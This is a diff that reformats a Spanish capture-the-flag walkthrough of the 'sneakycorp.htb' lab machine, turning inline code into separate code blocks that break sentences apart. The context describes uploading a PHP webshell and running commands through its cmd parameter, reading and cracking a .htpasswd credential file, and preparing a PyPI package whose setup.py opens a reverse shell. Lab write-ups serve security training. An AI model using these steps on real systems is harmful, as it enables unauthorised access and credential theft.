@@ -68,7 +68,11 @@ ftp 10.10.10.197
 whatweb http://10.10.10.197
 ```
 
-Hay un redirect a `sneakycorp.htb`
+Hay un redirect a 
+```bash
+ sneakycorp.htb 
+```
+
 
 #### Add sneakycorp.htb host {-}
 
@@ -195,7 +199,11 @@ cd dev
 dir
 ```
 
-Aqui vemos el contenido de la web. Nos creamos la famosa `s4vishell.php`
+Aqui vemos el contenido de la web. Nos creamos la famosa 
+```bash
+ s4vishell.php 
+```
+
 
 ```php
 <?php
@@ -211,12 +219,28 @@ put s4vishell.php
 transfer complete
 ```
 
-Controlamos en la web si vemos el fichero `http://sneakycorp.htb/s4vishell.php` pero tenemos un *404 NOT FOUND*.
+Controlamos en la web si vemos el fichero 
+```bash
+ http://sneakycorp.htb/s4vishell.php 
+```
+ pero tenemos un *404 NOT FOUND*.
 Intentamos con otras url:
 
-- `http://sneakycorp.htb/s4vishell.php`
-- `http://10.10.10.197:8080/s4vishell.php`
-- `http://10.10.10.197:8080/dev/s4vishell.php`
+- 
+```bash
+ http://sneakycorp.htb/s4vishell.php 
+```
+
+- 
+```bash
+ http://10.10.10.197:8080/s4vishell.php 
+```
+
+- 
+```bash
+ http://10.10.10.197:8080/dev/s4vishell.php 
+```
+
 
 pero nada. Aqui pensamos en que podria tener otros subdominios.
 
@@ -228,7 +252,11 @@ pero nada. Aqui pensamos en que podria tener otros subdominios.
 gobuster vhost -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-Encontramos el subdominio `dev.sneakycorp.htb`
+Encontramos el subdominio 
+```bash
+ dev.sneakycorp.htb 
+```
+
 
 #### Descubrimiento de subdominios con WFUZZ {-}
 
@@ -236,7 +264,11 @@ Encontramos el subdominio `dev.sneakycorp.htb`
 wfuzz -c -t 200 --hw=12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.sneakycorp.htb" http://10.10.10.197
 ```
 
-Encontramos el subdominio `dev.sneakycorp.htb`
+Encontramos el subdominio 
+```bash
+ dev.sneakycorp.htb 
+```
+
 
 #### Retocamos en hosts {-}
 
@@ -248,10 +280,22 @@ nano /etc/hosts
     knitr::include_graphics("images/hosts-dev-sneakycorp.png")
 
 ![hosts-dev-seakycor](/assets/images/hosts-dev-sneakycorp.png) 
-Como aqui ya tenemos un nuevo dominio browseamos la web en `dev.sneakycorp.htb/s4vishell.php` y ahora si encontramos nuestra webshell.
+Como aqui ya tenemos un nuevo dominio browseamos la web en 
+```bash
+ dev.sneakycorp.htb/s4vishell.php 
+```
+ y ahora si encontramos nuestra webshell.
 
-- whoami con `dev.sneakycorp.htb/s4vishell.php?cmd=whoami`
-- verificamos si estamos en un contenedor con `dev.sneakycorp.htb/s4vishell.php?cmd=hostname -I`
+- whoami con 
+```bash
+ dev.sneakycorp.htb/s4vishell.php?cmd=whoami 
+```
+
+- verificamos si estamos en un contenedor con 
+```bash
+ dev.sneakycorp.htb/s4vishell.php?cmd=hostname -I 
+```
+
 
 no es el caso y tenemos capacidad de remote code execution. Ahora intentamos ganar acceso al sistema.
 ## Explotacion de vulnerabilidad & Ganando acceso {-}
@@ -300,7 +344,11 @@ ps -fawwx
 ```
 
 Vemos la flag pero no podemos leerla. Huele a que nos tenemos que convertir al usuario **low**. Tambien vemos un recurso **Pypi** con
-un fichero de credenciales tipo `.htpasswd`
+un fichero de credenciales tipo 
+```bash
+ .htpasswd 
+```
+
 
 ```cat
 cat /var/www/pypi.sneakycorp.htb/.htpasswd
@@ -308,7 +356,15 @@ cat /var/www/pypi.sneakycorp.htb/.htpasswd
 
 Vemos la contraseña del usuarion **pypi**. La copiamos en la maquina de atacante y tratamos de romperla con **John**
 
-Por ultimo se puede ver un nuevo subdominio llamado `pypi.sneakycorp.htb`, lo introduzimos en el `/etc/hosts`
+Por ultimo se puede ver un nuevo subdominio llamado 
+```bash
+ pypi.sneakycorp.htb 
+```
+, lo introduzimos en el 
+```bash
+ /etc/hosts 
+```
+
 
 ### Crackeo con John {-}
 
@@ -323,7 +379,11 @@ Hemos podido crackear la contraseña del usuario pypi
 
 ### Descubrimiento de la configuration NGINX {-}
 
-Intentando conectarnos a la web por el subdominio `pypi.sneakycorp.htb`, vemos que hay una redirection automatica al domino normal.
+Intentando conectarnos a la web por el subdominio 
+```bash
+ pypi.sneakycorp.htb 
+```
+, vemos que hay una redirection automatica al domino normal.
 Sabiendo que estamos en frente de un **NGINX**, analizamos como el reverse proxy esta configurado.
 
 ```bash
@@ -334,8 +394,16 @@ cat sneakycorp.htb
 cat pypi.sneakycorp.htb
 ```
 
-Hay ya vemos que para ir al subdominio `pypi.sneakycorp.htb` tenemos que pasar por el puerto **8080**, y efectivamente si browseamos
-la web con `pypi.sneakycorp.htb:8080` ya podemos ver la web del **pypi server**
+Hay ya vemos que para ir al subdominio 
+```bash
+ pypi.sneakycorp.htb 
+```
+ tenemos que pasar por el puerto **8080**, y efectivamente si browseamos
+la web con 
+```bash
+ pypi.sneakycorp.htb:8080 
+```
+ ya podemos ver la web del **pypi server**
 
 ### Crear un packete malicioso para pypi {-}
 
@@ -350,7 +418,15 @@ touch __init__.py
 touch setup.py
 ```
 
-El fichero `__init__.py` se queda vacio y el contenido del `setup.py` seria el siguiente.
+El fichero 
+```bash
+ __init__.py 
+```
+ se queda vacio y el contenido del 
+```bash
+ setup.py 
+```
+ seria el siguiente.
 
 ```python
 import setuptools
@@ -381,7 +457,11 @@ setuptools.setup(
 ```
 
 La idea aqui es que cuando el pypi server ejecute el setup.py, queremos que nos entable una reverse shell. El codigo
-de la reverse shell es de **monkey pentester** y la hemos retocado para que vaya en el fichero `setup.py`.
+de la reverse shell es de **monkey pentester** y la hemos retocado para que vaya en el fichero 
+```bash
+ setup.py 
+```
+.
 
 Configuramos el equipo para poder enviar el paquete al repositorio victima.
 
@@ -390,7 +470,11 @@ rm ~/.pypirc
 vi ~/.pypirc
 ```
 
-El contenido del fichero `.pypirc` seria
+El contenido del fichero 
+```bash
+ .pypirc 
+```
+ seria
 
 ```bash
 [distutils]
